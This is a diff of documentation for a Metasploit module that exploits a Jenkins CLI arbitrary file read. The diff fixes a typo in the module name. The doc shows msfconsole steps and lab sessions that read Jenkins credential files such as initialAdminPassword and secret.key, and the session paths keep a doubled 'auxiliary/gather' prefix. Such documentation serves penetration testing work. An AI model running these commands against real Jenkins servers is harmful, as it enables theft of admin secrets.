@@ -59,7 +59,7 @@ LTS Version 2.426.2: `docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:2.4
 
 1. Install the application
 1. Start msfconsole
-1. Do: `use auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read`
+1. Do: `use auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read`
 1. Do: `set rhost [ip]`
 1. Do: `run`
 1. You should get the first two lines of the `FILE_PATH`
@@ -99,12 +99,12 @@ Locality to use for reading the file. This may mangle binary files. Defaults to 
 ### jenkins 2.440-jdk17 on Docker
 
 ```
-msf6 > use auxiliary/gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read
-msf6 auxiliary(gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read) > set rhost 127.0.0.1
+msf6 > use auxiliary/gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read
+msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set rhost 127.0.0.1
 rhost => 127.0.0.1
-msf6 auxiliary(gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read) > set file_path /var/jenkins_home/secrets/initialAdminPassword
+msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set file_path /var/jenkins_home/secrets/initialAdminPassword
 file_path => /var/jenkins_home/secrets/initialAdminPassword
-msf6 auxiliary(gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read) > run
+msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > run
 [*] Running module against 127.0.0.1
 
 [*] Sending requests with UUID: ed148f4d-709a-4d16-a452-4509f3a37ed6
@@ -118,12 +118,12 @@ f5d5f6e98e1f466aad22c0f81ca48fb0
 ### jenkins 2.426.2-lts on Docker
 
 ```
-msf6 > use auxiliary/gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read
-msf6 auxiliary(gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read) > set rhost 127.0.0.1
+msf6 > use auxiliary/gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read
+msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set rhost 127.0.0.1
 rhost => 127.0.0.1
-msf6 auxiliary(gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read) > set file_path /var/jenkins_home/secret.key
+msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set file_path /var/jenkins_home/secret.key
 file_path => /var/jenkins_home/secret.key
-msf6 auxiliary(gather/auxiliary/gather/jenkins_ccli_ampersand_arbitrary_file_read) > run
+msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > run
 [*] Running module against 127.0.0.1
 
 [*] Sending requests with UUID: 0d69c3f1-7695-4db1-a0c6-08108f33e339
